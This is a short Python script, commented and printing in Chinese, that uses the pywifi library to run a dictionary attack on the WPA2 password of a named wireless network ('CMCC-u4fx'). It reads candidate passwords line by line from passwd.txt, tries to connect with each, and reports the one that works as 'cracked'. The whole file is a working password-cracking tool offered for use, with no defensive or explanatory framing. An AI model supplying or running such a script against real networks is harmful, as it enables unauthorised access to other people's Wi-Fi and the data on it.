import pywifi
from pywifi import const
import time
import datetime


def wifiConnect(pwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = "CMCC-u4fx"
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")



def readPassword():
    print("开始破解:")
    path = "passwd.txt"
    file = open(path, "r")
    while True:
        try:
            padd = file.readline()
            booll = wifiConnect(padd)

            if booll:
                print("密码已破解： ", padd)
                print("WiFi已连接")
                break
            else:
                print("密码错误: ", padd)
        except:
            continue


start = datetime.datetime.now()
readPassword()
end = datetime.datetime.now()
print("破解WIFI密码使用时间：{}".format(end - start))

